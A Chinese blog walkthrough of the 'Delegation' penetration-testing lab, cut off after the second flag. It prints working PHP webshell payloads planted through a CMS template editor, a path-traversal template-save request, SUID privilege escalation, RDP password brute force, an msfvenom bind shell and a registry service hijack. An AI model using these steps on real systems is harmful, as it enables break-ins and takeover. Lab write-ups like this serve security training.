@@ -1,0 +1,447 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>春秋云镜-Delegation | Hundredsu'Blog</title><meta name="author" content="Hundredsu"><meta name="copyright" content="Hundredsu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="信息收集 http:&#x2F;&#x2F;39.99.128.241&#x2F; fscan直接扫  flag01 访问一下发现是cms，用poc扫一下，同时搜历史漏洞  扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）  访问admin，直接跳转 admin&#x2F;123456 直接登录成功 在模版处 修改 1&lt;?&#x3D;system($_POST[a]);die();">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜-Delegation">
+<meta property="og:url" content="https://hundredsu.github.io/post/bdc052b9.html">
+<meta property="og:site_name" content="Hundredsu&#39;Blog">
+<meta property="og:description" content="信息收集 http:&#x2F;&#x2F;39.99.128.241&#x2F; fscan直接扫  flag01 访问一下发现是cms，用poc扫一下，同时搜历史漏洞  扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）  访问admin，直接跳转 admin&#x2F;123456 直接登录成功 在模版处 修改 1&lt;?&#x3D;system($_POST[a]);die();">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://hundredsu.github.io/img/avatar.jpg">
+<meta property="article:published_time" content="2025-08-07T08:46:41.000Z">
+<meta property="article:modified_time" content="2025-08-07T17:49:16.899Z">
+<meta property="article:author" content="Hundredsu">
+<meta property="article:tag" content="靶机渗透">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://hundredsu.github.io/img/avatar.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "春秋云镜-Delegation",
+  "url": "https://hundredsu.github.io/post/bdc052b9.html",
+  "image": "https://hundredsu.github.io/img/avatar.jpg",
+  "datePublished": "2025-08-07T08:46:41.000Z",
+  "dateModified": "2025-08-07T17:49:16.899Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Hundredsu",
+      "url": "https://hundredsu.github.io/"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/avatar.jpg"><link rel="canonical" href="https://hundredsu.github.io/post/bdc052b9.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.3.4"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"/search.xml","preload":false,"top_n_per_article":1,"unescape":false,"languages":{"hits_empty":"未找到符合您查询的内容：${query}","hits_stats":"共找到 ${hits} 篇文章"}},
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '春秋云镜-Delegation',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">27</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><img class="site-icon" src="/img/avatar.jpg" alt="Logo"><span class="site-name">Hundredsu'Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">春秋云镜-Delegation</span></a></span><div id="menus"><div id="search-button"><span class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></span></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">春秋云镜-Delegation</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-08-07T08:46:41.000Z" title="发表于 2025-08-07 16:46:41">2025-08-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-08-07T17:49:16.899Z" title="更新于 2025-08-08 01:49:16">2025-08-08</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><p>信息收集</p>
+<p><a target="_blank" rel="noopener" href="http://39.99.128.241/">http://39.99.128.241/</a></p>
+<p>fscan直接扫</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/1.png"></p>
+<h2 id="flag01"><a href="#flag01" class="headerlink" title="flag01"></a>flag01</h2><p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/2.png"></p>
+<p>访问一下发现是cms，用poc扫一下，同时搜历史漏洞</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/3.png"></p>
+<p>扫出来了，但是我也搜到了其他的（具体的版本号可以登录后台后确定下来，但是也可以像这样直接探测一下）</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/4.png"></p>
+<p>访问admin，直接跳转</p>
+<p>admin&#x2F;123456</p>
+<p>直接登录成功</p>
+<p>在模版处</p>
+<p>修改</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?=system(<span class="variable">$_POST</span>[a]);die();?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/5.png"></p>
+<p>访问主页即可</p>
+<p>主页会加载其他的模块内容</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/6.png"></p>
+<p>这里我用另一个poc</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?<span class="keyword">case</span>=template&amp;act=save&amp;admin_dir=admin&amp;site=default HTTP/1.1</span><br><span class="line">Host: 39.98.119.143</span><br><span class="line">Content-Length: 80</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=UTF-8</span><br><span class="line">Origin: http://39.98.119.143</span><br><span class="line">Referer: http://39.98.119.143/index.php?<span class="keyword">case</span>=index&amp;act=index&amp;admin_dir=admin&amp;site=default</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=vtencsmrhhid57f4pqk7dtio6u; login_username=admin; login_password=a14cdfc627cef32c707a7988e70c1313</span><br><span class="line">Connection: keep-alive</span><br><span class="line"></span><br><span class="line">sid=#data_d_.._d_.._d_.._d_2.php&amp;slen=693&amp;scontent=&lt;?php <span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">&quot;test&quot;</span>]);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/7.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/8.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/9.png"></p>
+<p>原来垃圾校园网的问题！！！淦</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/10.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/11.png"></p>
+<p>蚁剑连上后得知是linux</p>
+<p>cat flag没权限</p>
+<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p>那么接下来就是内核、suid、sudo等了</p>
+<p>这里不用内核</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/12.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">/usr/bin/stapbpf</span><br><span class="line">/usr/bin/gpasswd</span><br><span class="line">/usr/bin/chfn</span><br><span class="line">/usr/bin/su</span><br><span class="line">/usr/bin/chsh</span><br><span class="line">/usr/bin/staprun</span><br><span class="line">/usr/bin/diff</span><br><span class="line">/usr/bin/fusermount</span><br><span class="line">/usr/bin/sudo</span><br><span class="line">/usr/bin/mount</span><br><span class="line">/usr/bin/newgrp</span><br><span class="line">/usr/bin/umount</span><br><span class="line">/usr/bin/passwd</span><br><span class="line">/usr/lib/openssh/ssh-keysign</span><br><span class="line">/usr/lib/dbus-1.0/dbus-daemon-launch-helper</span><br><span class="line">/usr/lib/eject/dmcrypt-get-device</span><br></pre></td></tr></table></figure>
+
+<p>这里我们就用&#x2F;usr&#x2F;bin&#x2F;diff</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/13.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/var/www/html$  diff --line-format=%L /dev/null /home/flag/flag01.txt</span><br><span class="line">  ____  U _____ u  _     U _____ u   ____      _       _____             U  ___ u  _   _     </span><br><span class="line"> |  _<span class="string">&quot;\ \| ___&quot;</span>|/ |<span class="string">&quot;|    \| ___&quot;</span>|/U /<span class="string">&quot;___|uU  /&quot;</span>\  u  |_ <span class="string">&quot; _|     ___     \/&quot;</span>_ \/ | \ |<span class="string">&quot;|    </span></span><br><span class="line"><span class="string">/| | | | |  _|&quot;</span> U | | u   |  _|<span class="string">&quot;  \| |  _ / \/ _ \/     | |      |_&quot;</span>_|    | | | |&lt;|  \| |&gt;   </span><br><span class="line">U| |_| |\| |___  \| |/__  | |___   | |_| |  / ___ \    /| |\      | | .-,_| |_| |U| |\  |u   </span><br><span class="line"> |____/ u|_____|  |_____| |_____|   \____| /_/   \_\  u |_|U    U/| |\u\_)-\___/  |_| \_|    </span><br><span class="line">  |||_   &lt;&lt;   &gt;&gt;  //  \\  &lt;&lt;   &gt;&gt;   _)(|_   \\    &gt;&gt;  _// \\_.-,_|___|_,-.  \\    ||   \\,-. </span><br><span class="line"> (__)_) (__) (__)(_<span class="string">&quot;)(&quot;</span>_)(__) (__) (__)__) (__)  (__)(__) (__)\_)-<span class="string">&#x27; &#x27;</span>-(_/  (__)   (_<span class="string">&quot;)  (_/  </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">flag01: flag&#123;e3a1c8e2-1db5-4a47-997f-28414f2a5460&#125;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Great job!!!!!!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Here is the hint: WIN19\Adrian</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">I&#x27;ll do whatever I can to rock you...</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取flag1</p>
+<h2 id="flag02–RDP爆破密码喷洒"><a href="#flag02–RDP爆破密码喷洒" class="headerlink" title="flag02–RDP爆破密码喷洒"></a>flag02–RDP爆破密码喷洒</h2><p>接下来信息收集</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line">www-data@localhost:/var/www/html$ ./fscan -h 172.22.4.0/24</span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| <span class="string">&#x27;__/ _` |/ __| |/ /</span></span><br><span class="line"><span class="string">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span></span><br><span class="line"><span class="string">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span></span><br><span class="line"><span class="string">                     fscan version: 1.8.4</span></span><br><span class="line"><span class="string">start infoscan</span></span><br><span class="line"><span class="string">trying RunIcmp2</span></span><br><span class="line"><span class="string">The current user permissions unable to send icmp packets</span></span><br><span class="line"><span class="string">start ping</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.7      is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.19     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.45     is alive</span></span><br><span class="line"><span class="string">(icmp) Target 172.22.4.36     is alive</span></span><br><span class="line"><span class="string">[*] Icmp alive hosts len is: 4</span></span><br><span class="line"><span class="string">172.22.4.19:139 open</span></span><br><span class="line"><span class="string">172.22.4.7:139 open</span></span><br><span class="line"><span class="string">172.22.4.45:135 open</span></span><br><span class="line"><span class="string">172.22.4.19:135 open</span></span><br><span class="line"><span class="string">172.22.4.7:135 open</span></span><br><span class="line"><span class="string">172.22.4.7:88 open</span></span><br><span class="line"><span class="string">172.22.4.45:80 open</span></span><br><span class="line"><span class="string">172.22.4.36:80 open</span></span><br><span class="line"><span class="string">172.22.4.36:3306 open</span></span><br><span class="line"><span class="string">172.22.4.45:445 open</span></span><br><span class="line"><span class="string">172.22.4.7:445 open</span></span><br><span class="line"><span class="string">172.22.4.19:445 open</span></span><br><span class="line"><span class="string">172.22.4.45:139 open</span></span><br><span class="line"><span class="string">172.22.4.36:22 open</span></span><br><span class="line"><span class="string">172.22.4.36:21 open</span></span><br><span class="line"><span class="string">[*] alive ports len is: 15</span></span><br><span class="line"><span class="string">start vulscan</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.4.7</span></span><br><span class="line"><span class="string">   [-&gt;]DC01</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.4.7</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.4.19</span></span><br><span class="line"><span class="string">   [-&gt;]FILESERVER</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.4.19</span></span><br><span class="line"><span class="string">[*] NetInfo </span></span><br><span class="line"><span class="string">[*]172.22.4.45</span></span><br><span class="line"><span class="string">   [-&gt;]WIN19</span></span><br><span class="line"><span class="string">   [-&gt;]172.22.4.45</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.4.45     XIAORANG\WIN19                </span></span><br><span class="line"><span class="string">[*] OsInfo 172.22.4.7   (Windows Server 2016 Datacenter 14393)</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter 14393</span></span><br><span class="line"><span class="string">[*] NetBios 172.22.4.19     FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.4.36        code:200 len:68063  title:中文网页标题</span></span><br><span class="line"><span class="string">[*] WebTitle http://172.22.4.45        code:200 len:703    title:IIS Windows Server</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p>这里我是用的苏神的vshell直接挂载代理了就不重复了</p>
+<p>（第二次打我用stowaway重新搭建了隧道，具体可以看之前我Brute4road那篇）</p>
+<p>整理一下资产</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.45     XIAORANG\WIN19</span><br><span class="line">172.22.4.7      [+] DC:DC01.xiaorang.lab             Windows Server 2016 Datacenter</span><br><span class="line">172.22.4.19   FILESERVER.xiaorang.lab             Windows Server 2016 Standard 14393</span><br><span class="line">172.22.4.36   跳板机 已拿下</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>前面的提示也显示出要打XIAORANG\WIN19  （也就是45）</p>
+<p>已知用户名进行爆破</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 hydra 172.22.4.45 rdp -l Adrian -P rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/14.png"></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[proxychains] Strict chain  ...  193.134.210.161:1081 [proxychains] Strict chain  ...  193.134.210.161:1081 [proxychains] Strict chain  ...  193.134.210.161:1081  ...  172.22.4.45:3389  ...  172.22.4.45:3389  ...  172.22.4.45:3389 [3389][rdp] host: 172.22.4.45   login: Adrian   password: babygirl</span><br></pre></td></tr></table></figure>
+
+<p>爆破成功</p>
+<p>这里建议用kali连，因为需要改密码</p>
+<p>用kali可以直接弹桌面</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure>
+
+
+
+<p>修改密码为1qaz@WSX</p>
+<p>连接成功</p>
+<p>桌面上直接就有 privesccheck 提权脚本扫描结果</p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/15.png"></p>
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/16.png"></p>
+<p>直接获取flag文件没成功</p>
+<p>那我们就需要<strong>提权</strong></p>
+<h3 id="提权-1"><a href="#提权-1" class="headerlink" title="提权"></a>提权</h3><p>正常是先获取一个shell（本地kali监听完后直接运行木马就可以了）</p>
+<p>但这里我们可以直接使用启动项提权（我们拥有修改注册表的权限）</p>
+<p>由于目标不出网，所以需要正向连接</p>
+<p>这里使用vshell的木马没成功</p>
+<p>那么我们尝试使用其他的</p>
+<p>试试msf的</p>
+<p>先生成木马</p>
+<p>在kali本地机中生成</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/bind_tcp LPORT=3344 -f exe &gt; aaa.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<p>直接cmd</p>
+<p>修改注册表中的启动项为我们的恶意木马</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">reg add <span class="string">&quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot;</span> /t REG_EXPAND_SZ /v ImagePath /d <span class="string">&quot;C:\Users\Adrian\Desktop\aaa.exe&quot;</span> /f</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> payload windows/meterpreter/bind_tcp</span><br><span class="line"><span class="built_in">set</span> rhost 172.22.4.45</span><br><span class="line"><span class="built_in">set</span> lport 3344</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/17.png"></p>
+<p>这边run完，就在rdp执行下面的命令</p>
+<p>启动一下服务</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sc start gupdate</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/18.png"></p>
+<p>然后shell就弹回来了</p>
+<p>但是要尽快进程迁移，不然一下就断了</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ps     <span class="comment">#查看进程</span></span><br><span class="line"></span><br><span class="line">migrate pid</span><br></pre></td></tr></table></figure>
+
+<p><img src="/img/%E6%98%A5%E7%A7%8B%E4%BA%91%E9%95%9C-Delegation/19.png"></p>
+<p>选一个同为system的</p>
+<p>获取flag02</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; <span class="built_in">cat</span> /users/Administrator/flag/flag02.txt</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line">[proxychains] DLL init: proxychains-ng 4.15</span><br><span class="line"> ________  _______   ___       _______   ________  ________  _________  ___  ________  ________      </span><br><span class="line">|\   ___ \|\  ___ \ |\  \     |\  ___ \ |\   ____\|\   __  \|\___   ___\\  \|\   __  \|\   ___  \    </span><br><span class="line">\ \  \_|\ \ \   __/|\ \  \    \ \   __/|\ \  \___|\ \  \|\  \|___ \  \_\ \  \ \  \|\  \ \  \\ \  \   </span><br><span class="line"> \ \  \ \\ \ \  \_|/_\ \  \    \ \  \_|/_\ \  \  __\ \   __  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \  </span><br><span class="line">  \ \  \_\\ \ \  \_|\ \ \  \____\ \  \_|\ \ \  \|\  \ \  \ \  \   \ \  \ \ \  \ \  \\\  \ \  \\ \  \ </span><br><span class="line">   \ \_______\ \_______\ \_______\ \_______\ \_______\ \__\ \__\   \ \__\ \ \__\ \_______\ \__\\ \__\</span><br><span class="line">    \|_______|\|_______|\|_______|\|_______|\|_______|\|__|\|__|    \|__|  \|__|\|_______|\|__| \|__|</span><br><span class="line"></span><br><span 